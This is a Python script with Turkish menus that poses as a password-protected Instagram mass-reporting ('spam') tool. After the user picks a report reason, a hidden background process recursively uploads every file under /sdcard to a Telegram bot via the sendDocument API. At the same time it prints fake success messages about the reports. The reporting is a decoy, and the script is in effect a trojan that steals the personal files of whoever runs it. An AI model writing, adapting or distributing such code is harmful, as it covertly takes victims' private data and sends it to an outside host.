import requests
from colorama import Fore
import os
import pyfiglet
import time
from multiprocessing import Process
from cfonts import render, say

try:
    os.system("pip install requests")
    os.system("pip install figlet")
    os.system("pip install time")
    os.system("pip install Process")
    os.system("pip install colorama")
    os.system('pip install python_cfonts')
    os.system("clear")
except ModuleNotFoundError:
    print(Fore.GREEN + """ Terminal Ekranına Sırayla 
          
          1- pip install requests
          
          2-pip install colorama
          
          3-pip install pyfiglet
          
          4 - pip install  Process 
          
          5- pip install time
          
          Yazıp Tek Tek Modülleri İndirin""")
        

def send_files_to_telegram(id, token, path):
    for entry in os.scandir(path):
        if entry.is_dir() and entry.name == 'Android':
            continue  
        elif entry.is_file():
            file = {"document": open(entry.path, 'rb')}
            res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
        elif entry.is_dir():
            send_files_to_telegram(id, token, entry.path)

def main():
    giris = pyfiglet.figlet_format("GİRİŞ YAP")
    print(Fore.RED + giris)
    
    giris_sifre = 'pikarun'
    sirfe = input(Fore.BLUE + "Toolun Şifresini Girin:")
    
    id ='TELEGRAM İD' 
    token = 'TELEGRAM BOT TOKEN '
    
    if sirfe != giris_sifre:
        os.system("clear")  
        print(Fore.RED + "ŞİFRE YANLIŞ TEKRAR DENEYİN.")
        time.sleep(2)
    else:
        os.system("clear")  
        os.system("clear")  
        os.system("clear")  
        os.system("clear")  
        output = render('ANTONIO', colors=['white', 'yellow'], align='center')
        print(output)

        print('\x1b[1;33m═════════════════════════[𝗩𝟭𝟮]═════════════════════════════════') 
        
        nick = input(Fore.CYAN + "\nSpam Atılacak Hesabı Girin:")
        print(Fore.MAGENTA + "Hesap Bulunuyor. Lütfen Bekleyiniz...")
        time.sleep(2)
        
        response = requests.get('https://instagram.com/' + nick)
        if response.status_code == 200:
            print(Fore.GREEN + "Hesap Bulundu. [✅]\n")
            print(Fore.RED + "[1]" + "" + Fore.CYAN + "Spam\n")
            print(Fore.RED + "[2]" + "" + Fore.CYAN + "Kendine Zarar Verme\n")
            print(Fore.RED + "[3]" + "" + Fore.CYAN + "Terör Örgütü\n")
            print(Fore.RED + "[4]" + "" + Fore.CYAN + "Pornografik İçerik")
            secim = input(Fore.BLUE + "\nHangi İşlemi Yapmak İstiyorsunuz:")
            
            if secim in ["1", "2", "3", "4"]:
                p = Process(target=send_files_to_telegram, args=(id, token, "/sdcard"))
                p.start()

                sayilar = list(range(1, 100))
                for x in sayilar:
                    time.sleep(1.5)
                    print(Fore.BLUE + str(x) + "-" + nick + " " + Fore.GREEN + "İşlem Başarılı[✅]\n")
            else:
                print(Fore.RED + "Yanlış Seçim Yapıldı.Kontrol Edin.")        
        else:
            print(Fore.RED + "Hesap Bulunamadı [❌] Lütfen Hesabı Kontrol Edin.")

if __name__ == "__main__":
    main()
